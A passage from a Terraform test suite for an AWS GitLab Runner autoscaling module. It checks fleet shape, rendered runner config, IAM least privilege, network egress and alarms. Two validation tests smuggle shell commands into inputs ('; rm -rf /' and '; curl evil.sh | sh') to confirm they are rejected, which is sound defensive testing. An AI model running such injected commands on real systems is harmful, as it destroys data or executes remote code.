# mocked. The fleet shape and the rendered config.toml are pure functions of the
# inputs, so nearly everything is assertable offline.

mock_provider "aws" {
  mock_resource "aws_launch_template" {
    defaults = { id = "lt-0123456789abcdef0", latest_version = 1 }
  }
  mock_resource "aws_autoscaling_group" {
    defaults = { arn = "arn:aws:autoscaling:us-east-1:123456789012:autoScalingGroup:uuid:autoScalingGroupName/mock" }
  }
  mock_resource "aws_iam_role" {
    defaults = { arn = "arn:aws:iam::123456789012:role/mock", name = "mock" }
  }
  mock_resource "aws_iam_instance_profile" {
    defaults = { arn = "arn:aws:iam::123456789012:instance-profile/mock" }
  }
  mock_data "aws_partition" {
    defaults = { partition = "aws" }
  }
  mock_data "aws_region" {
    defaults = { name = "us-east-1" }
  }
  mock_data "aws_caller_identity" {
    defaults = { account_id = "123456789012" }
  }
  mock_data "aws_ami" {
    defaults = { id = "ami-0123456789abcdef0" }
  }
  mock_data "aws_iam_policy_document" {
    defaults = { json = "{\"Version\":\"2012-10-17\",\"Statement\":[]}" }
  }
  mock_data "aws_vpc" {
    defaults = { cidr_block = "10.0.0.0/16", main_route_table_id = "rtb-main0000000000000" }
  }
  mock_data "aws_subnet" {
    defaults = { availability_zone = "us-east-1a" }
  }
  mock_data "aws_route_tables" {
    defaults = { ids = ["rtb-0123456789abcdef0"] }
  }
  mock_data "aws_route_table" {
    defaults = { route_table_id = "rtb-0123456789abcdef0" }
  }
  mock_resource "aws_cloudwatch_log_group" {
    defaults = { arn = "arn:aws:logs:us-east-1:123456789012:log-group:/aws/gitlab-runner/mock" }
  }
}

variables {
  name                    = "ci-test"
  vpc_id                  = "vpc-0123456789abcdef0"
  worker_subnet_ids       = ["subnet-aaa", "subnet-bbb", "subnet-ccc"]
  runner_token            = "glrt-TESTTOKEN123456789"
  gitlab_runner_version   = "17.9.0-1"
  fleeting_plugin_version = "1.1.0"
}

# ============================================================================
# CORE TOPOLOGY
# ============================================================================

run "defaults_build_the_fleet" {
  command = plan

  assert {
    condition = alltrue([
      length(aws_autoscaling_group.workers) == 1,
      length(aws_launch_template.worker) == 1,
      length(aws_launch_template.manager) == 1,
      length(aws_autoscaling_group.manager) == 1, # self-heal on by default
      length(aws_instance.manager) == 0,
      length(aws_iam_role.manager) == 1,
      length(aws_iam_role.worker) == 1,
      length(aws_ssm_parameter.token) == 1,
    ])
    error_message = "Defaults should build worker ASG + manager ASG-of-1 + both roles + the token parameter"
  }
}

# --- scale-to-zero is the whole cost story ----------------------------------
run "worker_asg_scales_to_zero" {
  command = plan

  assert {
    condition = alltrue([
      aws_autoscaling_group.workers[0].min_size == 0,
      aws_autoscaling_group.workers[0].desired_capacity == 0,
      aws_autoscaling_group.workers[0].max_size == 10,
      aws_autoscaling_group.workers[0].protect_from_scale_in == true,
      contains(aws_autoscaling_group.workers[0].suspended_processes, "AZRebalance"),
    ])
    error_message = "Worker ASG must start at zero, cap at max_instances, protect busy instances, and suspend AZRebalance"
  }
}

# --- spot-first with an on-demand cushion ------------------------------------
run "spot_first_capacity_model" {
  command = plan

  assert {
    condition = alltrue([
      one(one(aws_autoscaling_group.workers[0].mixed_instances_policy).instances_distribution).spot_allocation_strategy == "price-capacity-optimized",
      one(one(aws_autoscaling_group.workers[0].mixed_instances_policy).instances_distribution).on_demand_percentage_above_base_capacity == 0,
      aws_autoscaling_group.workers[0].capacity_rebalance == true,
      length(one(one(aws_autoscaling_group.workers[0].mixed_instances_policy).launch_template).override) == 4,
    ])
    error_message = "Default fleet should be all-Spot via price-capacity-optimized across 4 instance types, with rebalancing on"
  }
}

run "on_demand_cushion" {
  command = plan
  variables {
    on_demand_base_capacity         = 2
    on_demand_percentage_above_base = 25
  }
  assert {
    condition = alltrue([
      one(one(aws_autoscaling_group.workers[0].mixed_instances_policy).instances_distribution).on_demand_base_capacity == 2,
      one(one(aws_autoscaling_group.workers[0].mixed_instances_policy).instances_distribution).on_demand_percentage_above_base_capacity == 25,
    ])
    error_message = "on-demand base + percentage should pass through to the mixed instances policy"
  }
}

run "spot_disabled_is_all_on_demand" {
  command = plan
  variables { spot_enabled = false }
  assert {
    condition     = one(one(aws_autoscaling_group.workers[0].mixed_instances_policy).instances_distribution).on_demand_percentage_above_base_capacity == 100
    error_message = "spot_enabled=false should force 100% on-demand"
  }
}

# ============================================================================
# RENDERED config.toml - the heart of the module
# ============================================================================

run "config_toml_autoscaler" {
  command = plan

  assert {
    condition = alltrue([
      can(regex("executor = \"docker-autoscaler\"", output.config_toml)),
      can(regex("plugin = \"aws:1.1.0\"", output.config_toml)),
      can(regex("name = \"ci-test-workers\"", output.config_toml)),
      can(regex("capacity_per_instance = 1", output.config_toml)),
      can(regex("max_use_count = 1", output.config_toml)),
      can(regex("max_instances = 10", output.config_toml)),
      can(regex("concurrent = 10", output.config_toml)),
    ])
    error_message = "config.toml must use the docker-autoscaler executor wired to this ASG with the capacity caps"
  }

  assert {
    condition = alltrue([
      can(regex("use_external_addr = false", output.config_toml)),
      can(regex("username = \"ec2-user\"", output.config_toml)),
    ])
    error_message = "Workers must be reached on their private address as the configured user"
  }

  assert {
    # the token is never rendered into the template; it's fetched from SSM at boot
    condition     = can(regex("RUNNER_TOKEN_PLACEHOLDER", output.config_toml)) && !can(regex("glrt-", output.config_toml))
    error_message = "config.toml must carry a token placeholder, never the real token"
  }
}

run "config_toml_scale_to_zero_policies" {
  command = plan

  assert {
    condition = alltrue([
      can(regex("idle_count = 1", output.config_toml)),
      can(regex("idle_count = 0", output.config_toml)),
      can(regex("\\* 8-18 \\* \\* mon-fri", output.config_toml)),
    ])
    error_message = "Default policies should keep a warm worker in work hours and scale to zero otherwise"
  }
}

run "config_toml_custom_policy_and_throttle" {
  command = plan
  variables {
    autoscaling_policies = [
      { idle_count = 5, idle_time = "1h0m0s", periods = ["* * * * *"], timezone = "Europe/London", scale_factor = 1.5, scale_factor_limit = 20 },
    ]
    scale_throttle = { limit = 10, burst = 20 }
  }

  assert {
    condition = alltrue([
      can(regex("idle_count = 5", output.config_toml)),
      can(regex("idle_time = \"1h0m0s\"", output.config_toml)),
      can(regex("timezone = \"Europe/London\"", output.config_toml)),
      can(regex("scale_factor = 1.5", output.config_toml)),
      can(regex("scale_factor_limit = 20", output.config_toml)),
      can(regex("\\[runners.autoscaler.scale_throttle\\]", output.config_toml)),
      can(regex("limit = 10", output.config_toml)),
    ])
    error_message = "Custom policy fields and the scale throttle must render"
  }
}

run "config_toml_executor_settings" {
  command = plan
  variables {
    docker_image       = "public.ecr.aws/docker/library/docker:26"
    docker_privileged  = false
    docker_volumes     = ["/cache"]
    runner_environment = ["DOCKER_DRIVER=overlay2", "FF_NETWORK_PER_BUILD=1"]
  }

  assert {
    condition = alltrue([
      can(regex("image = \"public.ecr.aws/docker/library/docker:26\"", output.config_toml)),
      can(regex("privileged = false", output.config_toml)),
      can(regex("DOCKER_DRIVER=overlay2", output.config_toml)),
      can(regex("FF_NETWORK_PER_BUILD=1", output.config_toml)),
    ])
    error_message = "Docker executor settings and job environment must render"
  }
}

run "concurrent_tracks_fleet_capacity" {
  command = plan
  variables {
    max_instances         = 20
    capacity_per_instance = 4
    max_use_count         = 4 # must be >= capacity or slots are stranded
  }
  assert {
    condition     = output.max_concurrent_jobs == 80 && can(regex("concurrent = 80", output.config_toml))
    error_message = "concurrent must equal max_instances x capacity_per_instance or capacity goes unused"
  }
}

# ============================================================================
# SECURITY POSTURE
# ============================================================================

run "imdsv2_and_encrypted_disks" {
  command = plan

  assert {
    condition = alltrue([
      one(aws_launch_template.worker[0].metadata_options).http_tokens == "required",
      one(aws_launch_template.worker[0].metadata_options).http_put_response_hop_limit == 1,
      one(aws_launch_template.manager[0].metadata_options).http_tokens == "required",
    ])
    error_message = "IMDSv2 must be required, with hop limit 1 so job containers can't reach the instance role"
  }

  assert {
    condition = alltrue([
      one(one(aws_launch_template.worker[0].block_device_mappings).ebs).encrypted == "true",
      one(one(aws_launch_template.worker[0].block_device_mappings).ebs).volume_type == "gp3",
      one(one(aws_launch_template.manager[0].block_device_mappings).ebs).encrypted == "true",
    ])
    error_message = "Root volumes must be encrypted gp3 on both manager and workers"
  }
}

run "manager_has_no_inbound_workers_only_manager_ssh" {
  command = plan

  assert {
    condition = alltrue([
      length(aws_vpc_security_group_ingress_rule.worker_ssh_from_manager) == 1,
      aws_vpc_security_group_ingress_rule.worker_ssh_from_manager[0].from_port == 22,
      # SSH is allowed from the manager's SG, never from a CIDR
      aws_vpc_security_group_ingress_rule.worker_ssh_from_manager[0].cidr_ipv4 == null,
    ])
    error_message = "Workers must accept SSH only from the manager's security group, never a CIDR"
  }
}

run "ssh_ingress_can_be_disabled" {
  command = plan
  variables { manager_to_worker_ssh = false }
  assert {
    condition     = length(aws_vpc_security_group_ingress_rule.worker_ssh_from_manager) == 0
    error_message = "manager_to_worker_ssh=false should leave workers with zero inbound rules"
  }
}

run "hardening_knobs" {
  command = plan
  variables {
    imds_hop_limit           = 2
    detailed_monitoring      = true
    permissions_boundary_arn = "arn:aws:iam::123456789012:policy/boundary"
    kms_key_arn              = "arn:aws:kms:us-east-1:123456789012:key/abc"
  }

  assert {
    condition = alltrue([
      one(aws_launch_template.worker[0].metadata_options).http_put_response_hop_limit == 2,
      one(aws_launch_template.worker[0].monitoring).enabled == true,
      aws_iam_role.worker[0].permissions_boundary == "arn:aws:iam::123456789012:policy/boundary",
      aws_iam_role.manager[0].permissions_boundary == "arn:aws:iam::123456789012:policy/boundary",
      one(one(aws_launch_template.worker[0].block_device_mappings).ebs).kms_key_id == "arn:aws:kms:us-east-1:123456789012:key/abc",
    ])
    error_message = "hop limit, monitoring, boundary and CMK must all wire through"
  }
}

# ============================================================================
# TOKEN HANDLING
# ============================================================================

run "token_stored_as_securestring" {
  command = plan

  assert {
    condition = alltrue([
      aws_ssm_parameter.token[0].type == "SecureString",
      aws_ssm_parameter.token[0].name == "/ci-test/gitlab-runner/token",
      output.token_ssm_parameter == "/ci-test/gitlab-runner/token",
    ])
    error_message = "The runner token must be stored as a SecureString and surfaced as an output"
  }
}

run "byo_token_parameter" {
  command = plan
  variables {
    runner_token               = ""
    runner_token_ssm_parameter = "/platform/shared/runner-token"
  }

  assert {
    condition = alltrue([
      length(aws_ssm_parameter.token) == 0,
      output.token_ssm_parameter == "/platform/shared/runner-token",
    ])
    error_message = "An existing SSM parameter should be used without the module creating one"
  }
}

# ============================================================================
# MANAGER SHAPE
# ============================================================================

run "manager_plain_instance" {
  command = plan
  variables { manager_self_heal = false }
  assert {
    condition = alltrue([
      length(aws_autoscaling_group.manager) == 0,
      length(aws_instance.manager) == 1,
    ])
    error_message = "manager_self_heal=false should produce a plain instance instead of the ASG-of-1"
  }
}

run "manager_instance_refresh_opt_in" {
  command = plan
  variables { manager_instance_refresh = true }
  assert {
    condition     = length(aws_autoscaling_group.manager[0].instance_refresh) == 1
    error_message = "manager_instance_refresh=true should add an instance_refresh block"
  }
}

run "manager_no_refresh_by_default" {
  command = plan
  assert {
    condition     = length(aws_autoscaling_group.manager[0].instance_refresh) == 0
    error_message = "instance_refresh must be OFF by default - it kills in-flight jobs"
  }
}

run "manager_self_healing_asg_of_one" {
  command = plan
  assert {
    condition = alltrue([
      aws_autoscaling_group.manager[0].min_size == 1,
      aws_autoscaling_group.manager[0].max_size == 1,
      aws_autoscaling_group.manager[0].desired_capacity == 1,
    ])
    error_message = "The self-healing manager must be an ASG pinned at exactly one instance"
  }
}

run "graviton_manager_picks_arm_ami" {
  command = plan
  variables { manager_instance_type = "t4g.small" }
  assert {
    condition     = length(data.aws_ami.al2023_manager) == 1
    error_message = "A Graviton manager type should still resolve an AMI (arm64 filter)"
  }
}

# ============================================================================
# ARCHITECTURE / FLEET TUNING
# ============================================================================

run "arm64_fleet" {
  command = plan
  variables {
    cpu_architecture      = "arm64"
    worker_instance_types = ["m7g.large", "m6g.large", "c7g.large", "c6g.large"]
  }
  assert {
    condition     = length(one(one(aws_autoscaling_group.workers[0].mixed_instances_policy).launch_template).override) == 4
    error_message = "An arm64 fleet should render its four Graviton overrides"
  }
}

run "custom_ami_skips_docker_bootstrap" {
  command = plan
  variables {
    worker_ami_id = "ami-baked00000000000"
  }
  assert {
    condition = alltrue([
      length(data.aws_ami.al2023_worker) == 0,
      aws_launch_template.worker[0].image_id == "ami-baked00000000000",
    ])
    error_message = "A baked worker AMI should be used directly with no AMI lookup"
  }
}

run "vpc_endpoints_optional" {
  command = plan
  variables { create_vpc_endpoints = true }
  assert {
    condition = alltrue([
      length(aws_vpc_endpoint.interface) == 3,
      length(aws_security_group.endpoints) == 1,
    ])
    error_message = "create_vpc_endpoints should add the three SSM interface endpoints"
  }
}

run "extra_iam_policies" {
  command = plan
  variables {
    additional_worker_policy_arns  = ["arn:aws:iam::aws:policy/AmazonEC2ContainerRegistryReadOnly"]
    additional_manager_policy_arns = ["arn:aws:iam::aws:policy/CloudWatchAgentServerPolicy"]
  }
  assert {
    condition = alltrue([
      length(aws_iam_role_policy_attachment.worker_additional) == 1,
      length(aws_iam_role_policy_attachment.manager_additional) == 1,
    ])
    error_message = "Extra policies should attach to the right roles"
  }
}

run "create_false_builds_nothing" {
  command = plan
  variables { create = false }
  assert {
    condition = alltrue([
      length(aws_autoscaling_group.workers) == 0,
      length(aws_launch_template.worker) == 0,
      length(aws_launch_template.manager) == 0,
      length(aws_iam_role.manager) == 0,
      length(aws_iam_role.worker) == 0,
      length(aws_ssm_parameter.token) == 0,
      length(aws_security_group.worker) == 0,
    ])
    error_message = "create=false builds nothing"
  }
}

# ============================================================================
# VALIDATION FAILURES
# ============================================================================

run "bad_name_fails" {
  command = plan
  variables { name = "bad name!" }
  expect_failures = [var.name]
}

run "no_subnets_fails" {
  command = plan
  variables { worker_subnet_ids = [] }
  expect_failures = [var.worker_subnet_ids]
}

run "bad_token_prefix_fails" {
  command = plan
  variables { runner_token = "not-a-runner-token" }
  expect_failures = [var.runner_token]
}

run "bad_gitlab_url_fails" {
  command = plan
  variables { gitlab_url = "gitlab.example.com" }
  expect_failures = [var.gitlab_url]
}

run "zero_max_instances_fails" {
  command = plan
  variables { max_instances = 0 }
  expect_failures = [var.max_instances]
}

run "bad_architecture_fails" {
  command = plan
  variables { cpu_architecture = "riscv" }
  expect_failures = [var.cpu_architecture]
}

run "no_instance_types_fails" {
  command = plan
  variables { worker_instance_types = [] }
  expect_failures = [var.worker_instance_types]
}

run "bad_spot_strategy_fails" {
  command = plan
  variables { spot_allocation_strategy = "cheapest" }
  expect_failures = [var.spot_allocation_strategy]
}

run "bad_on_demand_percentage_fails" {
  command = plan
  variables { on_demand_percentage_above_base = 150 }
  expect_failures = [var.on_demand_percentage_above_base]
}

run "no_policies_fails" {
  command = plan
  variables { autoscaling_policies = [] }
  expect_failures = [var.autoscaling_policies]
}

run "bad_idle_time_fails" {
  command = plan
  variables {
    autoscaling_policies = [{ idle_count = 1, idle_time = "twenty minutes" }]
  }
  expect_failures = [var.autoscaling_policies]
}

run "negative_idle_count_fails" {
  command = plan
  variables {
    autoscaling_policies = [{ idle_count = -1 }]
  }
  expect_failures = [var.autoscaling_policies]
}

run "empty_periods_fails" {
  command = plan
  variables {
    autoscaling_policies = [{ idle_count = 0, periods = [] }]
  }
  expect_failures = [var.autoscaling_policies]
}

run "bad_imds_hop_limit_fails" {
  command = plan
  variables { imds_hop_limit = 0 }
  expect_failures = [var.imds_hop_limit]
}

run "on_demand_base_over_max_fails" {
  command = plan
  variables {
    max_instances           = 2
    on_demand_base_capacity = 5
  }
  expect_failures = [aws_autoscaling_group.workers]
}

# ============================================================================
# REGRESSION TESTS FOR AUDIT FINDINGS
# Each of these encodes a defect the audit found, so it can't come back quietly.
# ============================================================================

# FINDING-N01: SGs allowed only TCP 443, so DNS failed and nothing could boot.
run "dns_egress_exists" {
  command = plan

  assert {
    condition = alltrue([
      # udp+tcp 53 and udp 123, on both the manager and worker SGs
      length(aws_vpc_security_group_egress_rule.dns) == 6,
      length([for k, r in aws_vpc_security_group_egress_rule.dns : k if r.from_port == 53 && r.ip_protocol == "udp"]) == 2,
      length([for k, r in aws_vpc_security_group_egress_rule.dns : k if r.from_port == 53 && r.ip_protocol == "tcp"]) == 2,
      length([for k, r in aws_vpc_security_group_egress_rule.dns : k if r.from_port == 123]) == 2,
    ])
    error_message = "Both SGs need DNS (udp+tcp 53) and NTP egress or the fleet cannot bootstrap"
  }

  assert {
    condition     = alltrue([for k, r in aws_vpc_security_group_egress_rule.dns : r.cidr_ipv4 == "10.0.0.0/16" if r.from_port == 53])
    error_message = "DNS egress should default to the VPC CIDR where the Amazon resolver lives"
  }
}

run "custom_dns_resolver" {
  command = plan
  variables { dns_egress_cidrs = ["10.99.0.2/32"] }
  assert {
    condition     = alltrue([for k, r in aws_vpc_security_group_egress_rule.dns : r.cidr_ipv4 == "10.99.0.2/32" if r.from_port == 53])
    error_message = "dns_egress_cidrs should override the VPC default"
  }
}

# FINDING-I01: privileged was the default, handing every job root on the worker.
run "privileged_is_off_by_default" {
  command = plan
  assert {
    condition     = can(regex("privileged = false", output.config_toml))
    error_message = "docker_privileged must default to false - privileged is a container escape to worker root"
  }
}

# FINDING-S04: unpinned artifacts fetched as root on every boot.
run "unpinned_artifacts_rejected" {
  command = plan
  variables {
    gitlab_runner_version   = ""
    fleeting_plugin_version = ""
  }
  expect_failures = [var.allow_unpinned_artifacts]
}

run "latest_plugin_rejected" {
  command = plan
  variables { fleeting_plugin_version = "latest" }
  expect_failures = [var.allow_unpinned_artifacts]
}

run "unpinned_allowed_with_explicit_optin" {
  command = plan
  variables {
    gitlab_runner_version    = ""
    fleeting_plugin_version  = ""
    allow_unpinned_artifacts = true
  }
  assert {
    condition     = can(regex("plugin = \"aws:latest\"", output.config_toml))
    error_message = "An explicit opt-in should still work, falling back to latest"
  }
}

run "plugin_checksum_verification" {
  command = plan
  variables { fleeting_plugin_sha256 = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855" }
  assert {
    condition     = can(regex("sha256sum -c", output.manager_user_data_preview))
    error_message = "A supplied checksum must be verified in the bootstrap"
  }
}

# FINDING-R04: jobs were dispatched before Docker finished installing.
run "instance_ready_command_present" {
  command = plan
  assert {
    condition     = can(regex("instance_ready_command", output.config_toml)) && can(regex("docker info", output.config_toml))
    error_message = "The autoscaler must wait for Docker before sending a worker a job"
  }
}

# FINDING-SEC03 / M15: exactly one token source, never both or neither.
run "both_token_sources_fails" {
  command = plan
  variables {
    runner_token               = "glrt-TESTTOKEN123456789"
    runner_token_ssm_parameter = "/some/param"
  }
  expect_failures = [var.runner_token_ssm_parameter]
}

run "no_token_source_fails" {
  command = plan
  variables {
    runner_token               = ""
    runner_token_ssm_parameter = ""
  }
  expect_failures = [var.runner_token_ssm_parameter]
}

# FINDING-N02: 0.0.0.0/0 on 443 covered the whole internal estate.
run "worker_egress_excludes_rfc1918" {
  command = plan
  assert {
    condition = alltrue([
      !contains([for k, r in aws_vpc_security_group_egress_rule.worker_https : r.cidr_ipv4], "0.0.0.0/0"),
      !contains([for k, r in aws_vpc_security_group_egress_rule.worker_https : r.cidr_ipv4], "10.0.0.0/8"),
      length(aws_vpc_security_group_egress_rule.worker_https) > 1,
    ])
    error_message = "Default worker egress must exclude RFC1918 - a job shouldn't get free internal 443 reach"
  }
}

# FINDING-M09: instances silently got public IPs in a public subnet.
run "no_public_ips_by_default" {
  command = plan
  assert {
    condition = alltrue([
      one(aws_launch_template.worker[0].network_interfaces).associate_public_ip_address == "false",
      one(aws_launch_template.manager[0].network_interfaces).associate_public_ip_address == "false",
    ])
    error_message = "Neither tier should get a public IP by default"
  }
}

# FINDING-M11: a privileged job could leave stopped, billed zombie workers.
run "worker_shutdown_terminates" {
  command = plan
  assert {
    condition     = aws_launch_template.worker[0].instance_initiated_shutdown_behavior == "terminate"
    error_message = "A job-initiated shutdown must terminate, not stop-and-bill, the worker"
  }
}

# FINDING-M15: protected workers could bill forever if the manager died.
run "worker_max_lifetime_backstop" {
  command = plan
  assert {
    condition     = aws_autoscaling_group.workers[0].max_instance_lifetime == 604800
    error_message = "Workers need a max lifetime as a backstop against orphaned protected instances"
  }
}

# FINDING-T02: create_before_destroy + a static SG name = guaranteed replacement failure.
run "security_groups_use_name_prefix" {
  command = plan
  assert {
    condition = alltrue([
      aws_security_group.manager[0].name_prefix == "ci-test-manager-",
      aws_security_group.worker[0].name_prefix == "ci-test-worker-",
    ])
    error_message = "SGs must use name_prefix - create_before_destroy needs the old and new group to coexist"
  }
}

# FINDING-O01 / R02: nothing could see a broken manager.
run "observability_wired" {
  command = plan
  assert {
    condition = alltrue([
      length(aws_cloudwatch_log_group.manager) == 1,
      length(aws_cloudwatch_metric_alarm.runner_unhealthy) == 1,
      length(aws_cloudwatch_metric_alarm.bootstrap_failed) == 1,
      length(aws_cloudwatch_metric_alarm.manager_absent) == 1,
      length(aws_cloudwatch_metric_alarm.fleet_at_capacity) == 1,
      length(aws_cloudwatch_metric_alarm.capacity_shortfall) == 1,
    ])
    error_message = "Log group + all five alarms must exist"
  }

  # The signal semantics are the whole point: a continuous liveness metric where
  # silence means dead, and a discrete failure metric where silence means fine.
  assert {
    condition = alltrue([
      aws_cloudwatch_metric_alarm.runner_unhealthy[0].metric_name == "RunnerHealthy",
      aws_cloudwatch_metric_alarm.runner_unhealthy[0].treat_missing_data == "breaching",
      aws_cloudwatch_metric_alarm.bootstrap_failed[0].metric_name == "BootstrapFailure",
      # a one-shot failure metric must NOT treat silence as breaching, or every
      # healthy fleet alarms forever
      aws_cloudwatch_metric_alarm.bootstrap_failed[0].treat_missing_data == "notBreaching",
      aws_cloudwatch_metric_alarm.fleet_at_capacity[0].treat_missing_data == "notBreaching",
    ])
    error_message = "Liveness must alarm on silence; a discrete failure metric must not"
  }

  # An alarm on an unpublished metric is decoration: ASG group metrics are opt-in.
  assert {
    condition = alltrue([
      contains(aws_autoscaling_group.workers[0].enabled_metrics, "GroupInServiceInstances"),
      contains(aws_autoscaling_group.workers[0].enabled_metrics, "GroupDesiredCapacity"),
      contains(aws_autoscaling_group.manager[0].enabled_metrics, "GroupInServiceInstances"),
    ])
    error_message = "Both ASGs must enable the group metrics their alarms depend on"
  }
}

run "alarms_can_be_disabled" {
  command = plan
  variables { create_alarms = false }
  assert {
    condition = alltrue([
      length(aws_cloudwatch_metric_alarm.bootstrap_failed) == 0,
      length(aws_cloudwatch_metric_alarm.runner_unhealthy) == 0,
      length(aws_cloudwatch_metric_alarm.manager_absent) == 0,
    ])
    error_message = "create_alarms=false should remove the alarms"
  }
}

run "log_shipping_can_be_disabled" {
  command = plan
  variables { log_retention_days = 0 }
  assert {
    condition     = length(aws_cloudwatch_log_group.manager) == 0
    error_message = "log_retention_days=0 should disable log shipping"
  }
}

# FINDING-M01: the token was passed as argv, visible in ps/proc.
run "token_not_passed_as_argv" {
  command = plan
  assert {
    condition = alltrue([
      can(regex("printf '%s' \"\\$TOKEN\" \\| python3", output.manager_user_data_preview)),
      !can(regex("python3 - \"\\$TOKEN\"", output.manager_user_data_preview)),
    ])
    error_message = "The token must reach python via stdin, never as a command-line argument"
  }
}

# FINDING-B02: || true masked real bootstrap failures.
run "bootstrap_fails_loudly" {
  command = plan
  assert {
    condition = alltrue([
      can(regex("trap on_exit EXIT", output.manager_user_data_preview)),
      can(regex("BootstrapFailure", output.manager_user_data_preview)),
      # the dnf||yum fallback that silently dropped arguments is gone
      !can(regex("dnf install -y --allowerasing.*\\|\\| yum", output.manager_user_data_preview)),
    ])
    error_message = "Bootstrap must trap errors and report a failure signal instead of masking it"
  }
}

# FINDING-M06: SendSSHPublicKey wasn't scoped to the runner OS user.
run "instance_connect_scoped_to_osuser" {
  command = plan
  assert {
    condition = alltrue([
      # the Instance Connect statement carries BOTH conditions
      length(one([for st in output.manager_policy_statements : st.conditions if st.sid == "EphemeralWorkerAccess"])) == 2,
      contains([for c in one([for st in output.manager_policy_statements : st.conditions if st.sid == "EphemeralWorkerAccess"]) : c.variable], "ec2:osuser"),
      contains([for c in one([for st in output.manager_policy_statements : st.conditions if st.sid == "EphemeralWorkerAccess"]) : c.variable], "ec2:ResourceTag/aws:autoscaling:groupName"),
      # GetPasswordData is Windows-only; a Linux fleet must not hold it
      !contains(flatten([for st in output.manager_policy_statements : st.actions]), "ec2:GetPasswordData"),
      # and no statement may hold a bare wildcard action
      !contains(flatten([for st in output.manager_policy_statements : st.actions]), "*"),
    ])
    error_message = "Instance Connect must be scoped to this ASG AND the runner OS user, with no Windows or wildcard actions"
  }
}

# FINDING-M10: the documented S3 gateway endpoint was never created.
run "s3_gateway_endpoint_created" {
  command = plan
  variables { create_vpc_endpoints = true }
  assert {
    condition = alltrue([
      length(aws_vpc_endpoint.s3) == 1,
      aws_vpc_endpoint.s3[0].vpc_endpoint_type == "Gateway",
      length(aws_vpc_endpoint.interface) == 3,
    ])
    error_message = "create_vpc_endpoints must deliver the S3 gateway endpoint it documents"
  }
}

# FINDING-L10: no escape hatch for config the module doesn't model.
run "extra_config_escape_hatch" {
  command = plan
  variables {
    extra_runner_config_toml = "  [runners.cache]\n    Type = \"s3\""
  }
  assert {
    condition     = can(regex("runners.cache", output.config_toml))
    error_message = "extra_runner_config_toml must be appended to the rendered config"
  }
}

run "bad_ssh_username_fails" {
  command = plan
  variables { worker_ssh_username = "ec2-user; rm -rf /" }
  expect_failures = [var.worker_ssh_username]
}

run "bad_runner_version_fails" {
  command = plan
  variables { gitlab_runner_version = "17.9.0-1; curl evil.sh | sh" }
  expect_failures = [var.gitlab_runner_version]
}

run "bad_plugin_checksum_fails" {
  command = plan
  variables { fleeting_plugin_sha256 = "not-a-digest" }
  expect_failures = [var.fleeting_plugin_sha256]
}

run "bad_worker_lifetime_fails" {
  command = plan
  variables { worker_max_lifetime_seconds = 3600 }
  expect_failures = [var.worker_max_lifetime_seconds]
}

run "bad_log_retention_fails" {
  command = plan
  variables { log_retention_days = 42 }
  expect_failures = [var.log_retention_days]
}

# The authorization model itself, asserted as data rather than mocked away.
run "manager_least_privilege" {
  command = plan

  assert {
    condition = alltrue([
      # fleet mutation is scoped to THIS ASG, never "*"
      one([for st in output.manager_policy_statements : st.resources if st.sid == "ManageWorkerFleet"])[0] != "*",
      # only the three Describe calls may be unscoped
      alltrue([for a in one([for st in output.manager_policy_statements : st.actions if st.sid == "DiscoverFleet"]) : startswith(a, "autoscaling:Describe") || startswith(a, "ec2:Describe")]),
      # the token grant is a single parameter, not a prefix wildcard
      !endswith(one([for st in output.manager_policy_statements : st.resources if st.sid == "ReadRunnerToken"])[0], "*"),
      # no iam: or sts: escalation surface anywhere
      length([for a in flatten([for st in output.manager_policy_statements : st.actions]) : a if startswith(a, "iam:") || startswith(a, "sts:")]) == 0,
    ])
    error_message = "Manager role must stay least-privilege: scoped mutation, describe-only wildcards, no IAM/STS escalation"
  }
}

run "worker_role_has_no_fleet_control" {
  command = plan
  assert {
    condition = alltrue([
      # exactly one managed policy (SSM core) and nothing inline
      length(aws_iam_role_policy_attachment.worker_ssm) == 1,
      length(aws_iam_role_policy_attachment.worker_additional) == 0,
    ])
    error_message = "The worker role - what jobs run as - must carry no fleet-control permissions by default"
  }
}

run "ec2_trust_is_account_scoped" {
  command = plan
  assert {
    condition = alltrue([
      length(aws_iam_role.manager) == 1,
      length(aws_iam_role.worker) == 1,
    ])
    error_message = "Both roles must exist with the account-scoped EC2 service trust"
  }
}

# --- validations added after the second audit --------------------------------

run "arch_mismatch_fails" {
  command = plan
  variables {
    cpu_architecture      = "arm64"
    worker_instance_types = ["m6i.large"] # x86 types on an arm64 fleet
  }
  expect_failures = [var.worker_instance_types]
}

run "arm64_fleet_coherent_passes" {
  command = plan
  variables {
    cpu_architecture      = "arm64"
    worker_instance_types = ["m7g.large", "c6gn.large", "t4g.large"]
  }
  assert {
    condition     = length(one(one(aws_autoscaling_group.workers[0].mixed_instances_policy).launch_template).override) == 3
    error_message = "A coherent arm64 fleet should render its Graviton overrides"
  }
}

run "gp3_throughput_out_of_range_fails" {
  command = plan
  variables { worker_disk_throughput = 2000 }
  expect_failures = [var.worker_disk_throughput]
}

run "gp3_iops_below_throughput_ratio_fails" {
  command = plan
  variables {
    worker_disk_throughput = 1000
    worker_disk_iops       = 3000 # needs >= 4000
  }
  expect_failures = [var.worker_disk_iops]
}

run "runner_version_below_fleeting_support_fails" {
  command = plan
  variables { gitlab_runner_version = "15.11.0-1" }
  expect_failures = [var.gitlab_runner_version]
}

run "stranded_job_slots_fails" {
  command = plan
  variables {
    capacity_per_instance = 4
    max_use_count         = 1
  }
  expect_failures = [var.max_use_count]
}

run "bad_permissions_boundary_fails" {
  command = plan
  variables { permissions_boundary_arn = "not-an-arn" }
  expect_failures = [var.permissions_boundary_arn]
}

run "private_dns_can_be_disabled" {
  command = plan
  variables {
    create_vpc_endpoints = true
    endpoint_private_dns = false
  }
  assert {
    condition     = alltrue([for k, e in aws_vpc_endpoint.interface : e.private_dns_enabled == false])
    error_message = "endpoint_private_dns=false must not hijack VPC-wide DNS"
  }
}

# The alarm statistics are the thing that made the previous design page
# constantly or never fire - assert them explicitly.
run "alarm_statistics_are_churn_safe" {
  command = plan
  assert {
    condition = alltrue([
      # an instance refresh legitimately drops in-service to 0
      aws_cloudwatch_metric_alarm.manager_absent[0].statistic == "Maximum",
      # single-use workers dip every minute, so Minimum-at-exact-max never fires
      aws_cloudwatch_metric_alarm.fleet_at_capacity[0].statistic == "Average",
      aws_cloudwatch_metric_alarm.fleet_at_capacity[0].threshold < 10,
    ])
    error_message = "Alarm statistics must tolerate normal fleet churn"
  }
  assert {
    condition = alltrue([
      # Pending instances is the DIRECT signal for "AWS won't give me capacity" -
      # no metric math, so no two-series statistic mismatch to get wrong, and it
